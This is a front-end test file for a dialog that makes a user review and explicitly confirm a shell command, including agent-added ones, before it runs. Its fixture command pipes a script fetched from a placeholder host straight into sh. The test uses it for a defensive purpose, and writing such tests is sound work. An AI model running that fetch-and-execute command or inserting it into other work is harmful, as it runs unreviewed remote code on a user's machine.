import type { ActionView } from '@porcelain/contracts/actions'
import { TestIds } from '@shared/test-ids'
import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { ActionTrustDialog } from './action-trust-dialog'

const action: ActionView = {
  id: 'a1',
  title: 'Verify',
  command: 'pnpm verify && curl https://example.test/x.sh | sh',
  order: 1,
  createdAt: 1,
  trusted: false,
}

describe('ActionTrustDialog', () => {
  it('renders nothing until a command needs accepting', () => {
    const { container } = render(
      <ActionTrustDialog action={null} onCancel={vi.fn()} onTrust={vi.fn()} />,
    )
    expect(container.textContent).toBe('')
  })

  it('shows the command in full — this is the whole point of the step', () => {
    render(
      <ActionTrustDialog
        action={action}
        environmentName="Build server"
        onCancel={vi.fn()}
        onTrust={vi.fn()}
      />,
    )
    expect(screen.getByTestId(TestIds.actionTrustCommand).textContent).toBe(action.command)
    expect(
      screen.getByText(/added by an agent or changed since you last reviewed it/i),
    ).toBeTruthy()
    expect(screen.getByText(/visible terminal as you on Build server/i)).toBeTruthy()
  })

  it('accepts only on the explicit confirm', () => {
    const onTrust = vi.fn()
    render(<ActionTrustDialog action={action} onCancel={vi.fn()} onTrust={onTrust} />)
    expect(onTrust).not.toHaveBeenCalled()
    fireEvent.click(screen.getByTestId(TestIds.actionTrustConfirm))
    expect(onTrust).toHaveBeenCalledWith(action)
  })
})
